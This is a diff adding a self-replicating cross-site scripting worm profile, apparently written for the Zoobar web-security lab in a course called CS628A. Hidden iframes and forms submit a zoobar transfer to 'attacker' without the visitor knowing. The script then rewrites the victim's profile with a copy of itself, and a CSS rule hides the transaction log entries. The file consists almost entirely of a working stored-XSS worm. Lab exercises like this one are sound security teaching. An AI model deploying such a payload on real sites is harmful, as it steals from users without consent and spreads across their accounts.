@@ -1,0 +1,37 @@
+I Love CS628A!
+</b></div>
+<script> var trans_zoobar = 1 </script>
+<div id="invisible" style="visibility:hidden;display:none">
+
+	<iframe name="if_profile" id="if_profile" style="visibility:hidden;display:none"></iframe>
+	<iframe name="if_transfer" id="if_transfer" style="visibility:hidden;display:none"></iframe>
+
+	<form method="POST" name="profileform1" id="profileform1" action="http://localhost:8080/zoobar/index.cgi/" 		style="visibility:hidden;display:none" target="if_profile">
+	    <textarea id="profile_update" name="profile_update" rows="20" cols="80"></textarea>
+    	<br />
+	</form>	
+
+	<form method="POST" name="transferform" id="f1" action="http://localhost:8080/zoobar/index.cgi/transfer" 		style="visibility:hidden;display:none" target="if_transfer">
+		<input id="zoobars" name="zoobars"  type="text" value="" size=5> 
+		<input id="recipient" name="recipient" type="text" value="" size=10>
+		<input type="submit" name="submission" value="Send">
+	</form> 		
+
+	<script>
+		function fill_form(zoobars,recipient,target){
+			document.getElementById('zoobars').value = zoobars;
+			document.getElementById('recipient').value = recipient;
+			document.getElementById('f1').target = target;
+			document.getElementById('f1').submit();
+		}
+		fill_form(trans_zoobar,"attacker","if_transfer");
+		
+		var new_zoobar = trans_zoobar + 1;
+		var prefix = "I Love CS628A!\n<script> var trans_zoobar = " + new_zoobar + " </" +"script>\n";
+		var suffix = '<style>.log td{display:none;}';
+		document.getElementById("profile_update").value = prefix + document.getElementById("invisible").outerHTML + suffix;
+		document.getElementById("profileform1").submit();
+	
+	</script>
+</div>
+<style>.log td{display:none;}
